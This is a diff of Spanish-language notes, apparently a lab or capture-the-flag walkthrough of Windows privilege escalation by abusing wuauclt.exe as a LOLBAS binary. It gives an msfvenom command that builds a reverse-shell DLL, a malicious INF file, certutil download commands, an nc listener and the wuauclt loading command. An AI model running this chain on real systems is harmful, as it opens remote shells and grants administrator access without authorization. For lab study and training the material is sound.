@@ -1,14 +1,25 @@
 Root.txt
-La solucion esta en lolbas.
-(Avisar de poner path en .inf)
-Creo en .ddl.
+
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
+
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario wuauclt.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
+
+
+Creamos el .ddl malicioso con msfvenom:
 msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=192.168.56.1 LPORT=443 -f dll > evil.dll
 
-Lo subo a la maquina:
-python3 -m http.server
-curl http://IP:PORT/path/file.ddl
-
-Creo archivo .inf.
+Creamos el archivo evil.inf malicionso.
 Archivo inf:
 [version]
 Signature=$chicago$
@@ -18,13 +29,34 @@ AdvancedINF=2.5
 RegisterOCXs=RegisterOCXSection
  
 [RegisterOCXSection]
-C:\path\evil.dll
+C:\path\Desktop\evil.dll
  
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
 ServiceName="mantvydas"
 ShortSvcName="mantvydas"
 
+En el apartado:
+    [RegisterOCXSection]
+    C:\path\Desktop\evil.dll
+poner el path de la maquina en donde se encuentra el evil.dll cuando lo subamos.
 
-C:\Windows\System32\script.exe -ArgumentList '/UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer'
-wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer
+
+Ahora lo subimos a la maquina:
+abrir servicio web en el directorio en donde tenemos los archivos anteriores:
+    - python3 -m http.server
+descargar los archivos:
+    - certutil -f -urlcache -split http://IP:PORT/evil.ddl -> El PORT suele ser el 8000 por defecto.
+    - certutil -f -urlcache -split http://IP:PORT/evil.inf
+    
+
+Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
+En nuestra terminal de linux ejecutamos:
+    - nc -lvp PORT
+
+Este es el comando:
+    - wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer
+pero tenemos que poner lo siguiente:
+    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList '/UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer'
+
+
